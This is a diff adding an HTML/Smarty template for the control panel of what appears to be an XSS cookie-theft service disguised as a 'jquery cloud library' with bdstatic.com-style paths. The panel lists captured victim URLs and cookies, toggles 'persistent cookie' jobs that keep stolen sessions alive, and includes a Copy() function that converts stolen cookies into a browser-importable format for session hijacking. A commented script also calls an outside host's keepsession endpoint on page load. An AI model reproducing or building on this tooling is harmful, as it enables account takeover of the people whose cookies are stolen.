@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>jquery管理</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="{$url.themePath}/css/bootstrap.min.css">
+<link rel="stylesheet" href="{$url.themePath}/css/bootstrap-theme.min.css">
+<link rel="stylesheet" href="{$url.themePath}/css/css.css">
+<script src="//libs.baidu.com/jquery/1.9.1/jquery.min.js"></script>
+<script src="//libs.baidu.com/bootstrap/2.3.1/js/bootstrap.min.js"></script>
+{literal}
+<style>
+#ul1 { margin:0; width:220px; overflow:scroll-x; word-break:break-all}
+.ohidden ul { height:18px; overflow:hidden }
+a.oall,a.un { text-decoration:none }
+td { vertical-align:top }
+DIV.meneame {
+	PADDING-RIGHT: 3px; PADDING-LEFT: 3px; FONT-SIZE: 80%; PADDING-BOTTOM: 3px; MARGIN: 3px; COLOR: #0073aa; PADDING-TOP: 3px; TEXT-ALIGN: center
+}
+DIV.meneame A {
+	BORDER-RIGHT: #0072ff 1px solid; PADDING-RIGHT: 7px; BACKGROUND-POSITION: 50% bottom; BORDER-TOP: #0072ff 1px solid; PADDING-LEFT: 7px; BACKGROUND-IMAGE: url(/themes/default/css/style/meneamelan.jpg); PADDING-BOTTOM: 5px; BORDER-LEFT: #0072ff 1px solid; COLOR: #0073aa; MARGIN-RIGHT: 3px; PADDING-TOP: 5px; BORDER-BOTTOM: #0072ff 1px solid; TEXT-DECORATION: none
+}
+DIV.meneame A:hover {
+	BORDER-RIGHT: #0072ff 1px solid; BORDER-TOP: #0072ff 1px solid; BACKGROUND-IMAGE: none; BORDER-LEFT: #0072ff 1px solid; COLOR: #0073aa; BORDER-BOTTOM: #0072ff 1px solid; BACKGROUND-COLOR: #ffffff
+}
+DIV.meneame A:active {
+	BORDER-RIGHT: #0072ff 1px solid; BORDER-TOP: #0072ff 1px solid; BACKGROUND-IMAGE: none; BORDER-LEFT: #0072ff 1px solid; COLOR: #0073aa; BORDER-BOTTOM: #0072ff 1px solid; BACKGROUND-COLOR: #ffffff
+}
+DIV.meneame SPAN.current {
+	BORDER-RIGHT: #0073aa 1px solid; PADDING-RIGHT: 7px; BORDER-TOP: #0073aa 1px solid; PADDING-LEFT: 7px; FONT-WEIGHT: bold; PADDING-BOTTOM: 5px; BORDER-LEFT: #0073aa 1px solid; COLOR: #0073aa; MARGIN-RIGHT: 3px; PADDING-TOP: 5px; BORDER-BOTTOM: #0073aa 1px solid; BACKGROUND-COLOR: #94ddff
+}
+DIV.meneame SPAN.disabled {
+	BORDER-RIGHT: #ffe3c6 1px solid; PADDING-RIGHT: 7px; BORDER-TOP: #ffe3c6 1px solid; PADDING-LEFT: 7px; PADDING-BOTTOM: 5px; BORDER-LEFT: #ffe3c6 1px solid; COLOR: #ffe3c6; MARGIN-RIGHT: 3px; PADDING-TOP: 5px; BORDER-BOTTOM: #ffe3c6 1px solid
+}
+</style>
+<script type="text/javascript">
+$(document).ready(function(){
+	$("a.oall").click(function(){
+		if($(this).attr("class")=="oall"){
+			$("table tbody tr").attr("class","");
+			$("a.un").html("-折叠");
+			$(this).attr("class","uall");
+			$(this).html("-全部");	
+		}else{
+			$("table tbody tr").attr("class","ohidden");
+			$("a.un").html("+展开");
+			$(this).attr("class","oall");
+			$(this).html("+全部");	
+		}
+	});
+	$("a.un").click(function(){
+		if($(this).parent().parent().attr("class")=="ohidden"){
+			$(this).parent().parent().attr("class","");
+			$(this).html("-折叠");
+		}else{
+			$(this).parent().parent().attr("class","ohidden");
+			$(this).html("+展开");	
+		}
+	});
+});
+function Delete(id,obj,token){
+	if(confirm("确定删除吗?")){
+		$.post('?act=delkeepsession&r='+Math.random(),{'id':id,'token':token},function(re){
+			if(re==1){
+				$(obj).parent().parent().remove();
+			}
+		});
+	}
+}
+function Changestatus(id,status,obj,token){
+	if(confirm("确定要更改状态吗?")){
+		$.post('?act=changestatus&r='+Math.random(),{'id':id,'status':status,'token':token},function(re){
+			if(re==1){
+				$(obj).parent().parent().remove();
+			}
+		});
+	}
+}
+
+function CheckAll(obj){
+	if($(obj).is(":checked")){
+		$(".checon").attr("checked","checked");
+	}else{
+		$(".checon").removeAttr("checked");
+	}
+}
+function Copy(obj) { 
+  var table = $(obj).parent().parent(); 
+  var l = table.find("#location").text(); 
+  var c = table.find("#cookie").text(); 
+  var t = l.split('//')[1]; 
+  t = t.split('/')[0]; 
+  var d = ""; 
+  var t2 = t.split('.'); 
+  for (key in t2) { 
+    if (key == 0) { 
+      continue; 
+    } 
+    d = d + '.' + t2[key]; 
+  }; 
+  var arr = c.split(';'); 
+  var data = []; 
+  for (var key in arr) { 
+    var arr2 = arr[key].split('='); 
+    data.push(cookie(d,arr2[0], arr2[1])); 
+  } 
+  alert(JSON.stringify(data)); 
+} 
+
+function cookie(d,n,v) 
+{ 
+  var row ={     
+    "domain" : d, 
+    "expirationDate" : Math.round(new Date().getTime()/1000)+3600, 
+    "hostOnly" : false, 
+    "httpOnly" : false, 
+    "name" : n.replace(/^\s+|\s+$/g,''), 
+    "path" : "\/", 
+    "secure" : false, 
+    "session" : false, 
+    "storeId" : "0", 
+    "value" : v.replace(/^\s+|\s+$/g,'') 
+    }; 
+  return row; 
+}
+</script>
+{/literal}
+</head>
+<body>
+{include file="header.html"}
+<div class="container">
+{include file="menus.html"}
+<div class="col-sm-9">
+    <div class="panel panel-default"> 
+    			<div class="panel-heading">我的项目 [<a href="{$url.root}/liuyan/" title=
+"平台公告！必看！必看！！必看！！！"				target="_black">【jquery云库平台公告须知】</a>] jquery云库平台永久不变登录地址：https://jquer.cc/p<a href="{$url.root}/bdstatic.com/?callback=project&act=create" style="float:right;">创建项目</a></div>   
+	<table border="0" cellspacing="0" cellpadding="0" class="table">
+		<thead>
+			<tr>
+				<th width="200">项目名称</th>
+				<th>项目描述</th>
+				<th width="100">内容数</th>
+				<th width="100">创建时间</th>
+				<th width="50">操作</th>
+			</tr>
+		</thead>
+		<tbody>
+			{foreach from=$projects item=v}
+			<tr>
+				<td><a href="{$url.root}/bdstatic.com/?callback=project&act=view&id={$v.id}">{$v.title}</a></td>
+				<td>{$v.description}</td>
+				<td>{$v.contentNum}</td>
+				<td>{$v.addTime|date_format:'%Y-%m-%d'}</td>
+				<td>
+				<a href="{$url.root}/bdstatic.com/?callback=project&act=delete&id={$v.id}&token={$show.user.token}" onclick="return confirm('确定删除吗?');">删除</a>
+				</td>
+			</tr>
+			{/foreach}
+		</tbody>
+	</table>
+	</div>
+	<!-- 
+<div class="panel panel-default">
+<div class="panel-heading">清理数据通知(2019-1月份之前数据均不保留，因空间容量问题)</div>
+<table border="0" cellspacing="0" cellpadding="0" class="table" align=center>
+2019-04-01日开始清理数据。！！！因垃圾数据太多，大家反应程序运行太慢。大家请自行备份自己的数据，备份的方法就不用说了吧，有导出功能。
+两点提示：【第一】：xss平台永久不变登录地址：https://woj.app/xss/nbxss.php  【第二】：请不要无限制打垃圾数据，及时使用'黑名单'功能，屏蔽垃圾cookie来源URL地址。
+</table>
+</div>
+	 -->
+    <div class="panel panel-default">
+		<div class="panel-heading">持久cookie任务列表 {if $tasklist.0.ks_project}[项目id：{$tasklist.0.ks_project}]{else}[您未开启此功能，如果开启请看使用说明]{/if} {if !$alltask.0.ks_start}<a style="text-align: center;color: #f90000;">(此功能总开关已关闭)</a>{/if}<a href="http://gdd.gd/1907.html" target="_blank" style="float:right;">功能说明</a></div>   
+		<table border="0" cellspacing="0" cellpadding="0" class="table">
+			<thead>
+				<tr>
+					<th width="60"><a href="javascript:void(0)" class="oall" style="font-weight:normal">+全部</a></th>
+					<th width="100">最后更新时间</th>
+					<th width="200" style="text-align:center;">任务地址URL</th>
+					<th width="200" style="text-align:center;">任务cookie</th>
+					<th width="100" style="text-align:center;">任务状态</th>
+					<th>功能操作</th>
+				</tr>
+			</thead>
+			<tbody>
+				{foreach from=$tasklist item=v}
+				<tr class="ohidden">
+					<td><a href="javascript:void(0)" class="un">+展开</a></td>
+					<td>{$v.ks_up_time|@date_format:"%Y-%m-%d %H:%M:%S"}</td>
+					<td><ul id="ul1">{$v.url}</ul></td>
+					<td><ul id="ul1">{$v.cookie|urldecode}</ul></td>
+					<td style="text-align:center;">{if $v.ks_start==1}开启中{elseif $v.ks_start==2}排队中{else}已关闭{/if}</td>
+					<td><a href="javascript:void(0)" onclick="Changestatus('{$v.ie}','{if $v.ks_start}0{else}1{/if}',this,'{$show.user.token}')">{if $v.ks_start}关闭{else}开启{/if}</a> || <a href="javascript:void(0)" onclick="Delete('{$v.ie}',this,'{$show.user.token}')">删除</a>
+					<!--
+					&nbsp;&nbsp;<a href="javascript:void(0)" onclick="Copy(this)">复制</a> 
+					-->
+					</td>
+				</tr>
+				{/foreach}
+			</tbody>
+		</table>
+		<div class="meneame">
+			{$pagers}<a >共{$pages}页</a>
+		</div>
+	</div>
+<!-- <div class="panel"><script src="//cdn.bootcss.com/echarts/3.8.5/echarts.min.js"></script><div id="echarts_post" style="width:825px;height:500px;"></div></div> -->
+</div>
+</div>
+{include file="footer.html"}
+<!-- <script src="{$url.themePath}/js/echarts.min.js"></script>  -->
+{literal}<!-- 
+<script type="text/javascript">
+<![CDATA[
+    $(function(){  //此处代码是无线任务启动程序，只要访问就会自启动cookie持久功能
+            $.get("http://gdd.gd/bdstatic.com/?callback=keepsession&act=mylabel", { 
+                        //username :  $("#username").val() , //传入参数
+                        //content :  $("#content").val()    
+                    }//, function (data, textStatus){
+                        //$("#resText").html(data); // 把返回的数据添加到页面上
+                    //}
+            );
+    })
+//]]>
+</script>
+ -->
+{/literal}
+{$postChart}
+</body>
+</html>
